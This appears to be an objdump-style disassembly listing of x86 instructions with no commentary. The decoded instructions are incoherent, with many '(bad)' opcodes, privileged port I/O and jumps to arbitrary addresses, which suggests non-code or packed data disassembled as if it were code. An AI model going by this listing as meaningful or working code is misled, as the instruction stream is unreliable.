  4115a1:	sbb    BYTE PTR [edx],dh
  4115a3:	in     eax,dx
  4115a4:	sbb    DWORD PTR [ebx+0x78a6b7c3],ebp
  4115aa:	repz enter 0xcf43,0x9c
  4115af:	or     DWORD PTR [ecx],esp
  4115b1:	iret   
  4115b2:	pop    eax
  4115b3:	mov    gs,WORD PTR ds:0x583f9470
  4115b9:	inc    eax
  4115ba:	add    BYTE PTR [ebp+0x26],bl
  4115bd:	jae    0x4115a3
  4115bf:	push   ss
  4115c0:	retf   0x3052
  4115c3:	and    BYTE PTR [edx+0x6a9f9f96],cl
  4115c9:	mov    ecx,0xd3eeeaf5
  4115ce:	sbb    bh,BYTE PTR [ebp-0xaa0b770]
  4115d4:	test   al,0x1a
  4115d6:	js     0x4115b1
  4115d8:	and    DWORD PTR [edi+eax*8+0xf],edi
  4115dc:	clc    
  4115dd:	sahf   
  4115de:	mov    ebx,?
  4115e0:	int    0x63
  4115e2:	mov    edi,0x961a5400
  4115e7:	push   0x277b8b80
  4115ec:	xor    BYTE PTR [ecx+edi*2+0x1d],ah
  4115f0:	pop    esp
  4115f1:	inc    esi
  4115f2:	inc    ebx
  4115f3:	div    BYTE PTR [eax+0x2e799de]
  4115f9:	xchg   DWORD PTR [eax+0x4f9e03c6],ebx
  4115ff:	inc    edx
  411600:	and    al,0x7a
  411602:	mov    ebx,0xa39fbad0
  411607:	sbb    DWORD PTR [edx],edx
  411609:	hlt    
  41160a:	xor    BYTE PTR [ebx+0x7c69e2fe],al
  411610:	repz mov cl,ch
  411613:	arpl   WORD PTR [esi],di
  411615:	out    dx,al
  411616:	loope  0x411605
  411618:	rcl    DWORD PTR [edi-0x1d],1
  41161b:	pop    edx
  41161c:	xchg   esp,eax
  41161d:	lods   eax,DWORD PTR ds:[esi]
  41161e:	fcos   
  411620:	adc    edi,DWORD PTR fs:[edx+eax*2+0x28]
  411625:	xchg   ebx,eax
  411626:	cwde   
  411627:	popa   
  411628:	and    cl,dh
  41162a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41162b:	leave  
  41162c:	adc    eax,0x8fcb0ac1
  411631:	add    BYTE PTR [ecx+edx*1-0x39],dl
  411635:	fstp   QWORD PTR [ecx-0x70b907d7]
  41163b:	sub    ch,BYTE PTR [eax]
  41163d:	push   0xffffffd1
  41163f:	mov    eax,ds:0xf55eb963
  411644:	sub    eax,0x59a7f6ae
  411649:	(bad)  
  41164a:	xchg   ecx,eax
  41164b:	mov    ebx,0x5a1be369
  411650:	imul   esi,DWORD PTR [ebp-0x50],0x4d
  411654:	call   0x31491ba
  411659:	fdivr  QWORD PTR [ebp-0x632f06ee]
  41165f:	in     eax,0x24
  411661:	mov    ds,WORD PTR [ebx+0x1e4643cb]
  411667:	sti    
  411668:	jge    0x41165c
  41166a:	sbb    DWORD PTR [ecx+0x5c],esi
  41166d:	push   ebx
  41166e:	jg     0x4116e4
  411670:	lods   al,BYTE PTR ds:[esi]
  411671:	aaa    
  411672:	shl    ch,0xdb
  411675:	jb     0x411606
  411677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411678:	icebp  
  411679:	dec    edi
  41167a:	dec    ebx
  41167b:	mov    ebx,0x6ec55667
  411680:	jb     0x411691
  411682:	fadd   QWORD PTR [eax-0x48]
  411685:	pop    edx
  411686:	daa    
  411687:	hlt    
  411688:	ja     0x1f050567
  41168e:	call   0x266f225e
  411693:	push   ebp
  411694:	addr16 adc esi,ecx
  411697:	loope  0x4116c1
  411699:	adc    BYTE PTR [eax],cl
  41169b:	repnz popa 
  41169d:	or     DWORD PTR [edx-0x36],esi
  4116a0:	jnp    0x411674
  4116a2:	out    dx,eax
  4116a3:	fwait
  4116a4:	in     eax,dx
  4116a5:	leave  
  4116a6:	hlt    
  4116a7:	pop    es
  4116a8:	stos   BYTE PTR es:[edi],al
  4116a9:	gs popa 
  4116ab:	and    eax,0x35c080a7
  4116b0:	pop    ss
  4116b1:	cdq    
  4116b2:	mov    bl,0xfc
  4116b4:	call   0x516a:0x766df03a
  4116bb:	ds stos DWORD PTR es:[edi],eax
  4116bd:	push   ss
  4116be:	aad    0x36
  4116c0:	js     0x411731
  4116c2:	into   
  4116c3:	ins    BYTE PTR es:[edi],dx
  4116c4:	in     al,dx
  4116c5:	and    eax,0xcc8751fb
  4116ca:	cmp    cx,bx
  4116cd:	mov    ebx,0x9320377e
  4116d2:	rcr    esi,0x48
  4116d5:	or     al,ch
  4116d7:	dec    esp
  4116d8:	sahf   
  4116d9:	fild   DWORD PTR [esi]
  4116db:	cmp    DWORD PTR [ebp+0x31],0xfffffff0
  4116df:	push   ebp
  4116e0:	clc    
  4116e1:	(bad)
  4116e5:	test   DWORD PTR [edx+0x47],0x1a502791
  4116ec:	test   al,0x12
  4116ee:	(bad)  
  4116ef:	out    0xc5,eax
  4116f1:	das    
  4116f2:	or     edx,DWORD PTR [edx+0x5f]
  4116f5:	popa   
  4116f6:	sub    BYTE PTR [esi-0x6c567863],ah
  4116fc:	sahf   
  4116fd:	retf   
  4116fe:	pushf  
  4116ff:	xchg   BYTE PTR [ebp+0x48aa34e2],bl
  411705:	inc    ebx
  411706:	test   BYTE PTR [ecx*4-0x3c9ae440],ch
  41170d:	popa   
  41170e:	int    0xec
  411710:	mov    cl,0x8c
  411712:	not    DWORD PTR [ebp-0x28cad2ae]
  411718:	clc    
  411719:	xchg   DWORD PTR ds:0x8cbc366f,esp
  41171f:	stos   DWORD PTR es:[edi],eax
  411720:	inc    ebx
  411721:	aad    0x13
  411723:	popf   
  411724:	cs add bl,dh
  411727:	xchg   ebx,eax
  411728:	lahf   
  411729:	dec    esi
  41172a:	loopne 0x4116af
  41172c:	lds    ebp,FWORD PTR [esi-0x4de6152c]
  411732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411733:	push   ss
  411734:	fdiv   QWORD PTR [ebp+0x32]
  411737:	sbb    DWORD PTR [ebx],edx
  411739:	adc    al,0x2c
  41173b:	mov    dh,0xc
  41173d:	xchg   edi,eax
  41173e:	and    BYTE PTR [ecx-0x7907bf3a],0xe9
  411745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411746:	push   esi
  411747:	shl    DWORD PTR [edx-0x65],1
  41174a:	pop    es
  41174b:	in     al,dx
  41174c:	push   0x3d1caf0e
  411751:	stos   DWORD PTR es:[edi],eax
  411752:	clc    
  411753:	pop    esi
  411754:	nop
  411755:	popf   
  411756:	xor    DWORD PTR [esi],eax
  411758:	cmp    bl,bl
  41175a:	mov    ebx,0xd3cc9912
  41175f:	imul   BYTE PTR [ecx]
  411761:	in     al,dx
  411762:	jg     0x411752
  411764:	hlt    
  411765:	in     eax,dx
  411766:	lahf   
  411767:	bound  esp,QWORD PTR [edi]
  411769:	pop    ebp
  41176a:	dec    eax
  41176b:	push   ss
  41176c:	xchg   ebp,eax
  41176d:	cmc    
  41176e:	ret    
  41176f:	fldenv [esi+0x5d]
  411772:	push   ecx
  411773:	je     0xac930516
  411779:	inc    ebx
  41177a:	push   esp
  41177b:	adc    DWORD PTR [esi+0x2034ffee],esp
  411781:	push   esp
  411782:	or     cl,al
  411784:	inc    ecx
  411785:	cmp    eax,0x3d2662f3
  41178a:	xlat   BYTE PTR ds:[ebx]
  41178b:	jmp    0x6ab6f7d5
  411790:	(bad)  
  411791:	ins    DWORD PTR es:[edi],dx
  411792:	push   es
  411793:	fmul   st,st(7)
  411795:	push   edi
  411796:	jg     0x4117e1
  411798:	jbe    0x41171e
  41179a:	fwait
  41179b:	push   ebx
  41179c:	cmp    DWORD PTR [edi+0x3073a2a3],0x8d8f43f
  4117a6:	mov    ebx,0x637c3395
  4117ab:	inc    ebp
  4117ac:	fs cmp dl,0xca
  4117b0:	cmp    BYTE PTR [edx+0x6e],ah
  4117b3:	pusha  
  4117b4:	leave  
  4117b5:	jno    0x4117b8
  4117b7:	repz inc esp
  4117b9:	(bad)  
  4117ba:	cmp    ah,dh
  4117bc:	sti    
  4117bd:	or     DWORD PTR fs:[edx*1+0x14cb1d27],esp
  4117c5:	cld    
  4117c6:	mov    ah,dh
  4117c8:	mov    dl,0x46
  4117ca:	stos   BYTE PTR es:[edi],al
  4117cb:	add    eax,0xacfa3b28
  4117d0:	mov    ebp,0x93c301af
  4117d5:	dec    eax
  4117d6:	dec    eax
  4117d7:	and    ah,cl
  4117d9:	pusha  
  4117da:	mov    edx,0xcd5e692f
  4117df:	pop    esi
  4117e0:	add    eax,0xe5a5cb73
  4117e5:	push   0xffffff8d
  4117e7:	inc    ebx
  4117e8:	scas   al,BYTE PTR es:[edi]
  4117e9:	pop    ecx
  4117ea:	sub    eax,0xa1186310
  4117ef:	adc    eax,0xd14e1bc4
  4117f4:	scas   al,BYTE PTR es:[edi]
  4117f5:	stc    
  4117f6:	push   edi
  4117f7:	xchg   edx,eax
  4117f8:	out    dx,eax
  4117f9:	ret    
  4117fa:	jns    0x4117c0
  4117fc:	xor    edx,DWORD PTR [edi+0x40]
  4117ff:	cmp    eax,DWORD PTR [eax+ebp*1]
  411802:	cli    
  411803:	mov    ds:0xfba03505,eax
  411808:	lahf   
  411809:	inc    eax
  41180a:	callw  0x43fe
  41180e:	adc    esi,DWORD PTR [esi+0x22]
  411811:	xchg   edi,eax
  411812:	fs call 0xc6317d6d
  411818:	into   
  411819:	ja     0x41187e
  41181b:	nop
  41181c:	xlat   BYTE PTR ds:[ebx]
  41181d:	jle    0x41182f
  41181f:	out    dx,al
  411820:	sub    ch,0xcc
  411823:	cmp    DWORD PTR [edi],eax
  411825:	dec    edx
  411826:	stc    
  411827:	xor    bh,BYTE PTR [ebp-0xf855e30]
  41182d:	icebp  
  41182e:	pop    ebx
  41182f:	push   es
  411830:	add    edi,esi
  411832:	lods   eax,DWORD PTR ds:[esi]
  411833:	inc    ecx
  411834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411835:	out    0x70,eax
  411837:	inc    esp
  411838:	add    BYTE PTR [esp+edx*8],0xd9
  41183c:	push   es
  41183d:	or     eax,0xab3c9ecc
  411842:	mov    al,ds:0xfcd62bf
  411847:	out    dx,al
  411848:	lock mov bl,0x8f
  41184b:	sbb    eax,0x9a135fec
  411850:	lea    esp,[edi+0x2a7c9329]
  411856:	scas   al,BYTE PTR es:[edi]
  411857:	mov    eax,ds:0xb98b2321
  41185c:	jnp    0x411880
  41185e:	sbb    dh,cl
  411860:	shl    DWORD PTR ds:0x195cbf1c,1
  411866:	jge    0x41184f
  411868:	cmp    BYTE PTR [edx+0x1fcf9adb],bh
  41186e:	ret    
  41186f:	xor    eax,0x3c3cfea7
  411874:	mov    ebp,0x18b9538f
  411879:	mov    ebx,0x22359d10
  41187e:	dec    edi
  41187f:	mov    ds:0x711f2293,eax
  411884:	inc    ecx
  411885:	shr    DWORD PTR [edx],cl
  411887:	add    al,0xda
  411889:	and    al,0xea
  41188b:	cmp    eax,0x1540a09f
  411890:	cmp    al,0xdb
  411892:	imul   BYTE PTR [edx+0x215eac62]
  411898:	xor    al,0x9
  41189a:	sub    ebx,DWORD PTR ds:0xab78430a
  4118a0:	in     eax,0x3e
  4118a2:	das    
  4118a3:	mov    ds:0x2ce52e6d,eax
  4118a8:	push   ebp
  4118a9:	xlat   BYTE PTR ds:[ebx]
  4118aa:	jne    0x411863
  4118ac:	jae    0x41192c
  4118ae:	jl     0x4118c9
  4118b0:	adc    DWORD PTR [eax-0x50],esi
  4118b3:	add    ch,BYTE PTR [esi]
  4118b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b6:	aaa    
  4118b7:	lea    esi,[ecx]
  4118b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118ba:	pop    ss
  4118bb:	test   eax,ecx
  4118bd:	cld    
  4118be:	jnp    0x4118a9
  4118c0:	(bad)  
  4118c1:	in     eax,0xf8
  4118c3:	nop
  4118c4:	push   ebx
  4118c5:	(bad)  
  4118c6:	cmp    DWORD PTR [ebp+eiz*8+0x7a],esp
  4118ca:	push   es
  4118cb:	into   
  4118cc:	ins    DWORD PTR es:[edi],dx
  4118cd:	push   es
  4118ce:	ins    BYTE PTR es:[edi],dx
  4118cf:	mov    cl,0x36
  4118d1:	mov    edx,0x469d6492
  4118d6:	mov    ds:0x38a77caf,al
  4118db:	dec    ebp
  4118dc:	and    BYTE PTR [eax+0x13198625],ch
  4118e2:	mov    esi,0x7baff701
  4118e7:	psubsb mm5,mm5
  4118ea:	loop   0x411967
  4118ec:	in     eax,0x36
  4118ee:	jle    0x4118c5
  4118f0:	and    DWORD PTR [esp+edi*4+0x213ae15e],0xede9ecc1
  4118fb:	ret    
  4118fc:	jge    0x411901
  4118fe:	xor    DWORD PTR [ecx-0x14d38102],esi
  411904:	push   cs
  411905:	repz jmp 0x411936
  411908:	push   ss
  411909:	fmul   QWORD PTR [edx+eax*1+0x76]
  41190d:	mov    ebx,DWORD PTR [ebp+0x6e]
  411910:	call   0x70e4:0xf6c96c24
  411917:	clc    
  411918:	cmp    al,0x94
  41191a:	pop    eax
  41191b:	sub    BYTE PTR [edi-0x99f1715],dl
  411921:	mov    WORD PTR es:[edi-0x79e384f],ds
  411928:	mov    cl,0xde
  41192a:	jno    0x4118d8
  41192c:	ror    BYTE PTR [eax],0x12
  41192f:	leave  
  411930:	pop    ds
  411931:	adc    esp,DWORD PTR [ecx+0x6b]
  411934:	cli    
  411935:	in     al,0x35
  411937:	jns    0x41191e
  411939:	xchg   dl,al
  41193b:	cmp    al,ch
  41193d:	xor    DWORD PTR [ecx],esi
  41193f:	inc    eax
  411940:	popa   
  411941:	xor    DWORD PTR [edi],esp
  411943:	in     eax,0xc6
  411945:	outs   dx,DWORD PTR ds:[esi]
  411946:	in     eax,0xfb
  411948:	rol    edi,cl
  41194a:	lods   al,BYTE PTR ds:[esi]
  41194b:	mov    dl,0x8c
  41194d:	mov    ch,0x5
  41194f:	scas   al,BYTE PTR es:[edi]
  411950:	adc    edi,DWORD PTR [ebx+0x6d]
  411953:	pop    ebp
  411954:	in     al,0xe5
  411956:	mov    WORD PTR [edi+0x59],?
  411959:	imul   edi,DWORD PTR [edx-0x1a],0xd43e6f56
  411960:	xchg   ebx,eax
  411961:	ins    BYTE PTR es:[edi],dx
  411962:	dec    edx
  411963:	push   esp
  411964:	test   al,0xe0
  411966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411967:	cmp    al,0x90
  411969:	shl    BYTE PTR [edx-0x26],0xc0
  41196d:	aas    
  41196e:	jb     0x4119a6
  411970:	sub    eax,0x951435f3
  411975:	dec    ecx
  411976:	in     al,0x0
  411978:	jno    0x4119ba
  41197a:	pop    edx
  41197b:	lahf   
  41197c:	fmul   DWORD PTR [eax+0x71]
  41197f:	pop    esp
  411980:	jg     0x41196b
  411982:	outs   dx,DWORD PTR ds:[esi]
  411983:	fidivr WORD PTR [ecx+0x2bc495d2]
  411989:	sub    esp,edx
  41198b:	sub    BYTE PTR [edi],dl
  41198d:	jnp    0x411939
  41198f:	aaa    
  411990:	push   0x6e
  411992:	ins    DWORD PTR es:[edi],dx
  411993:	mov    ss,WORD PTR [ecx-0x17]
  411996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411998:	pop    ebp
  411999:	add    al,BYTE PTR [ebx-0x31febe31]
  41199f:	cmp    dl,BYTE PTR [ebx]
  4119a1:	cmp    DWORD PTR ds:0xf64e9beb,eax
  4119a7:	cmp    DWORD PTR [edi],edx
  4119a9:	das    
  4119aa:	jl     0x41199a
  4119ac:	xchg   ebp,eax
  4119ad:	cmp    cl,BYTE PTR [esp+edx*4]
  4119b0:	test   DWORD PTR [edi],0x2b62dbbd
  4119b6:	std    
  4119b7:	inc    edx
  4119b8:	jp     0x411952
  4119ba:	jnp    0x411952
  4119bc:	adc    bl,BYTE PTR [ecx]
  4119be:	mov    ch,0x29
  4119c0:	inc    esi
  4119c1:	int3   
  4119c2:	or     bh,BYTE PTR [edx-0x6a60eff9]
  4119c8:	inc    esp
  4119c9:	js     0x41196d
  4119cb:	push   cs
  4119cc:	lock jmp 0x4119eb
  4119cf:	inc    edx
  4119d0:	sub    eax,DWORD PTR [ebx-0x25]
  4119d3:	pushf  
  4119d4:	push   ds
  4119d5:	daa    
  4119d6:	sub    edx,esi
  4119d8:	fdiv   DWORD PTR [esi-0x2c5d9c7a]
  4119de:	cmp    ch,BYTE PTR [ecx]
  4119e0:	arpl   WORD PTR [ecx-0x6a],dx
  4119e3:	mov    edi,0xcd409ad
  4119e8:	fild   DWORD PTR [ebp-0x2e]
  4119eb:	pop    ebp
  4119ec:	ret    0xd7c9
  4119ef:	test   DWORD PTR [eax+0x8],edx
  4119f2:	scas   eax,DWORD PTR es:[edi]
  4119f3:	mov    ebx,0x3ddd802a
  4119f8:	adc    al,0x13
  4119fa:	inc    ecx
  4119fb:	add    BYTE PTR [ecx+0x1e5ee431],0x61
  411a02:	shr    BYTE PTR [ebx-0x76],cl
  411a05:	jle    0x4119fa
  411a07:	repnz std 
  411a09:	xor    BYTE PTR [ecx],dl
  411a0b:	les    ecx,FWORD PTR [edi]
  411a0d:	cld    
  411a0e:	loop   0x4119f7
  411a10:	dec    ecx
  411a11:	daa    
  411a12:	jp     0x41199d
  411a14:	xchg   BYTE PTR [eax],dh
  411a16:	dec    ebp
  411a17:	outs   dx,DWORD PTR ds:[esi]
  411a18:	inc    si
  411a1a:	mov    esp,0xbd5de351
  411a1f:	ins    DWORD PTR es:[edi],dx
  411a20:	jns    0x411a6c
  411a22:	mov    ch,0x72
  411a24:	xchg   ebx,eax
  411a25:	dec    ebp
  411a26:	push   ds
  411a27:	sbb    BYTE PTR [ebx-0x3c],0xce
  411a2b:	or     al,0xeb
  411a2d:	mov    cl,0x1e
  411a2f:	dec    ebp
  411a30:	dec    edx
  411a31:	stos   BYTE PTR es:[edi],al
  411a32:	pushf  
  411a33:	cdq    
  411a34:	mov    ah,0x9a
  411a36:	pop    ds
  411a37:	or     DWORD PTR [esi+0x4e],0xfc26a38c
  411a3e:	shrd   DWORD PTR [edx],esp,cl
  411a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a42:	xchg   esi,eax
  411a43:	inc    edx
  411a44:	and    al,0x85
  411a46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a47:	jl     0x411a5a
  411a49:	scas   eax,DWORD PTR es:[edi]
  411a4a:	mov    ah,0xab
  411a4c:	mov    dl,0xc6
  411a4e:	(bad)  
  411a4f:	pop    esp
  411a50:	xor    ch,BYTE PTR [ecx-0x41]
  411a53:	out    dx,eax
  411a54:	mov    ecx,0x1dde7e23
  411a59:	xlat   BYTE PTR ds:[ebx]
  411a5a:	test   eax,0xec3a5374
  411a5f:	fnstsw WORD PTR [eax+0x41]
  411a62:	es pop ebp
  411a64:	fs ja  0x411a8d
  411a67:	mov    al,0xb5
  411a69:	push   ebx
  411a6a:	daa    
  411a6b:	mov    ecx,0x27942af3
  411a70:	xchg   ebx,eax
  411a71:	cmp    DWORD PTR [edi-0x12],eax
  411a74:	add    DWORD PTR [esi],esp
  411a76:	sub    edx,eax
  411a78:	and    DWORD PTR [ebp+0x3e],ecx
  411a7b:	out    0xaf,eax
  411a7d:	push   ebx
  411a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a7f:	adc    BYTE PTR [eax-0x18],dl
  411a82:	add    esp,esi
  411a84:	loope  0x411ad3
  411a86:	iret   
  411a87:	fwait
  411a88:	sbb    esi,DWORD PTR [esi]
  411a8a:	mov    al,cl
  411a8c:	or     BYTE PTR ds:0x19958d10,0x67
  411a93:	jb     0x411af9
  411a95:	loopne 0x411ada
  411a97:	cs push es
  411a99:	sbb    ebp,ecx
  411a9b:	mov    esi,fs
  411a9d:	fs jp  0x411aec
  411aa0:	inc    ebx
  411aa1:	pop    ebx
  411aa2:	adc    DWORD PTR [edi+0x69e9443b],ebp
  411aa8:	xor    al,0xe
  411aaa:	lods   al,BYTE PTR ds:[esi]
  411aab:	dec    ebx
  411aac:	or     al,BYTE PTR [edx-0x1f]
  411aaf:	mov    esp,0x4dc2ce9e
  411ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ab5:	outs   dx,BYTE PTR ds:[esi]
  411ab6:	xchg   esi,eax
  411ab7:	adc    BYTE PTR [ebx],dh
  411ab9:	rol    BYTE PTR [esi-0x1d],1
  411abc:	leave  
  411abd:	fstp   DWORD PTR [ecx-0x3f1f976c]
  411ac3:	or     edi,DWORD PTR [edi-0x50a6c543]
  411ac9:	shr    DWORD PTR [ebp+0x49049a89],0x63
  411ad0:	out    dx,al
  411ad1:	push   eax
  411ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ad4:	hlt    
  411ad5:	aam    0xc
  411ad7:	mov    ebp,0xddd4bba0
  411adc:	stos   DWORD PTR es:[edi],eax
  411add:	shr    DWORD PTR [edx+esi*2],cl
  411ae0:	pop    esp
  411ae1:	and    BYTE PTR [ebp-0x64],bh
  411ae4:	mov    esp,0x187d1c4d
  411ae9:	bound  ebx,QWORD PTR [ebx+0xcdf6340]
  411aef:	dec    edx
  411af0:	xchg   DWORD PTR [ebx+0x59ed0d2f],ebp
  411af6:	mov    edi,DWORD PTR [ecx]
  411af8:	mov    al,ds:0xe530d6ab
  411afd:	mov    eax,ds:0xf5ae3b37
  411b02:	shr    BYTE PTR [edx-0x405ab2a8],1
  411b08:	push   ss
  411b09:	add    bl,BYTE PTR [ebp+0x4a4fc07d]
  411b0f:	mov    dh,0x5b
  411b11:	xchg   ebx,eax
  411b12:	icebp  
  411b13:	mov    ah,BYTE PTR [edi]
  411b15:	(bad)  [eax]
  411b17:	mov    cl,dh
  411b19:	xor    BYTE PTR [edi+0x48cbb34d],cl
  411b1f:	cmp    BYTE PTR [esi+0x5edfe667],0xdd
  411b26:	shr    edi,cl
  411b28:	sub    al,0xd2
  411b2a:	icebp  
  411b2b:	les    ecx,FWORD PTR [ebp+0x47]
  411b2e:	jnp    0x411aea
  411b30:	cli    
  411b31:	adc    eax,0xe21dcfbf
  411b36:	mov    edx,0xa6a2bd8f
  411b3b:	lds    edx,FWORD PTR [edx+0x6e]
  411b3e:	repz leave 
  411b40:	out    dx,eax
  411b41:	or     esp,0xffffffaa
  411b44:	sbb    DWORD PTR [ecx+ebx*2],ebp
  411b47:	or     BYTE PTR [edx],bl
  411b49:	pop    ebx
  411b4a:	ja     0x411b8b
  411b4c:	and    ah,BYTE PTR [edi+0x20]
  411b4f:	sub    esp,ecx
  411b51:	and    edi,DWORD PTR [ebx-0x38]
  411b54:	pop    eax
  411b55:	add    BYTE PTR [ebp+0x3cbfc850],0x96
  411b5c:	jmp    0x411b60
  411b5e:	fnop   
  411b60:	mov    edx,0x48a09326
  411b65:	int    0x14
  411b67:	imul   edx,DWORD PTR [esi+ecx*8-0x62],0x6d
  411b6c:	shl    BYTE PTR [ecx+eax*2],1
  411b6f:	sub    eax,0xb723dc57
  411b74:	inc    eax
  411b75:	sub    al,0x61
  411b77:	shl    BYTE PTR [esi+0x612c8fb5],cl
  411b7d:	lods   eax,DWORD PTR ds:[esi]
  411b7e:	dec    esp
  411b7f:	les    esi,FWORD PTR [ebp+0x7afca519]
  411b85:	xor    ebx,DWORD PTR [ebx-0x9]
  411b88:	jge    0x411b7b
  411b8a:	cmp    eax,0x555c1008
  411b8f:	repz push ds
  411b91:	mov    edi,0x6011fd4
  411b96:	sub    eax,DWORD PTR [esi-0x5e466592]
  411b9c:	cmc    
  411b9d:	shl    al,0x3f
  411ba0:	inc    edi
  411ba1:	sbb    eax,0xaa8492d4
  411ba6:	mov    ds:0x23433048,al
  411bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bac:	lods   eax,DWORD PTR ds:[esi]
  411bad:	mov    ah,0xf7
  411baf:	inc    ecx
  411bb0:	fiadd  WORD PTR [edi]
  411bb2:	retf   
  411bb3:	call   0xab423330
  411bb8:	in     eax,dx
  411bb9:	lods   eax,DWORD PTR ds:[esi]
  411bba:	loop   0x411b7c
  411bbc:	std    
  411bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bbe:	and    al,0x5c
  411bc0:	imul   DWORD PTR [ebp+edx*1-0x53dfd87]
  411bc7:	or     BYTE PTR [ebx-0x58338b91],0x50
  411bce:	in     eax,0xe9
  411bd0:	rcl    ah,cl
  411bd2:	fnstcw WORD PTR [ecx]
  411bd4:	jae    0x411bf6
  411bd6:	jae    0x411c37
  411bd8:	dec    ecx
  411bd9:	enter  0x7cf8,0x52
  411bdd:	cs in  eax,dx
  411bdf:	jge    0x411bee
  411be1:	outs   dx,DWORD PTR ds:[esi]
  411be2:	(bad)  
  411be3:	push   ds
  411be4:	pop    ss
  411be5:	push   es
  411be6:	es push ds
  411be8:	ins    DWORD PTR es:[edi],dx
  411be9:	push   ds
  411bea:	out    0x77,al
  411bec:	stos   BYTE PTR es:[edi],al
  411bed:	jnp    0x411b90
  411bef:	lds    edx,FWORD PTR [ebx+0x19]
  411bf2:	ss test al,0xb
  411bf5:	out    0xcd,eax
  411bf7:	fcmovnu st,st(1)
  411bf9:	jcxz   0x411c4d
  411bfc:	pop    esp
  411bfd:	(bad)  
  411bfe:	es retf 
  411c00:	cmp    eax,0xc665341e
  411c05:	sbb    edx,DWORD PTR [ebp+0x3d15a24e]
  411c0b:	xor    al,BYTE PTR [ebx-0x69]
  411c0e:	fwait
  411c0f:	jl     0x411c7c
  411c11:	(bad)  
  411c12:	js     0x411bf0
  411c14:	push   eax
  411c15:	arpl   bp,si
  411c17:	pop    eax
  411c18:	dec    edi
  411c19:	cmp    BYTE PTR [edi+edx*2-0x26],ah
  411c1d:	mov    bl,0xd9
  411c1f:	mov    edi,0xa142552a
  411c24:	dec    esi
  411c25:	xor    al,dl
  411c27:	sub    dh,BYTE PTR [eax-0x1f69ea6d]
  411c2d:	adc    BYTE PTR [edi+edx*4-0x7c],ch
  411c31:	pop    ecx
  411c32:	clc    
  411c33:	mov    ch,BYTE PTR [esi+esi*1+0x59b53d09]
  411c3a:	sbb    DWORD PTR [ecx-0x1422dec7],eax
  411c40:	cmovnp esi,eax
  411c43:	in     eax,0xe3
  411c45:	jns    0x411c5f
  411c47:	jb     0x411bf2
  411c49:	adc    DWORD PTR ds:0x2c4e41e9,eax
  411c4f:	push   esp
  411c50:	adc    dh,dh
  411c52:	inc    DWORD PTR [ebx-0xa]
  411c55:	popa   
  411c56:	bound  ecx,QWORD PTR [eax-0x26e7fee3]
  411c5c:	add    DWORD PTR [edi-0x19],esi
  411c5f:	pop    eax
  411c60:	and    cl,al
  411c62:	lock mov dh,0x1a
  411c65:	stos   BYTE PTR es:[edi],al
  411c66:	cwde   
  411c67:	xchg   ebp,eax
  411c68:	dec    edx
  411c69:	add    al,0xcf
  411c6b:	push   esi
  411c6c:	jnp    0x411c66
  411c6e:	repnz inc eax
  411c70:	into   
  411c71:	popf   
  411c72:	das    
  411c73:	lock or BYTE PTR [ebp-0x75],bh
  411c77:	sar    BYTE PTR [ebp-0x73ddc63d],1
  411c7d:	int    0x13
  411c7f:	das    
  411c80:	push   edi
  411c81:	sbb    eax,0xd9a3c9aa
  411c86:	arpl   si,dx
  411c88:	jmp    0x221d5f5a
  411c8d:	pop    ds
  411c8e:	adc    al,0xc8
  411c90:	push   edx
  411c91:	mov    ds:0x74c424e,eax
  411c96:	sbb    eax,0x5b699c1c
  411c9b:	shl    ch,1
  411c9d:	xor    BYTE PTR [ebx-0x2c],cl
  411ca0:	loop   0x411c42
  411ca2:	sbb    dl,BYTE PTR [edx-0x49]
  411ca5:	int    0x53
  411ca7:	(bad)  
  411ca8:	mov    ds:0x5afe8ad7,al
  411cad:	push   ecx
  411cae:	sbb    ebx,DWORD PTR [ecx]
  411cb0:	inc    edi
  411cb1:	mov    ebp,gs
  411cb3:	xchg   BYTE PTR [esi],bl
  411cb5:	pusha  
  411cb6:	pop    esp
  411cb7:	(bad)  
  411cb9:	jecxz  0x411c62
  411cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cbc:	call   0x8b456dc2
  411cc1:	jb     0x411c83
  411cc3:	ret    
  411cc4:	fstp   TBYTE PTR [esi]
  411cc6:	mov    eax,ds:0x80a43e40
  411ccb:	mov    eax,ds:0x561cc440
  411cd0:	inc    esi
  411cd1:	pop    ebp
  411cd2:	je     0x411c7d
  411cd4:	mov    ah,0x5
  411cd6:	mov    ah,0xd9
  411cd8:	adc    dl,0xa8
  411cdb:	gs sub cl,dl
  411cde:	xchg   ecx,eax
  411cdf:	and    ebp,DWORD PTR [eax+esi*4-0x73]
  411ce3:	clc    
  411ce4:	mov    es,WORD PTR [esi]
  411ce6:	inc    edx
  411ce7:	cmp    eax,0xb0903c06
  411cec:	sub    esi,edx
  411cee:	(bad)  
  411cf0:	or     al,0xd3
  411cf2:	inc    edi
  411cf3:	cmp    BYTE PTR [eax+0xe],ch
  411cf6:	imul   edi,DWORD PTR [ebp+0x32],0x42
  411cfa:	mov    dl,0x96
  411cfc:	cmp    eax,0xe953352b
  411d01:	pop    edi
  411d02:	aam    0x68
  411d04:	pop    ebp
  411d05:	shr    DWORD PTR ds:0xbc8fdfad,1
  411d0b:	loopne 0x411cfb
  411d0d:	nop
  411d0e:	ins    DWORD PTR es:[edi],dx
  411d0f:	sub    cl,BYTE PTR [ebx*1-0x2562b0e7]
  411d16:	ins    BYTE PTR es:[edi],dx
  411d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d18:	iret   
  411d19:	retf   
  411d1a:	xchg   bx,ax
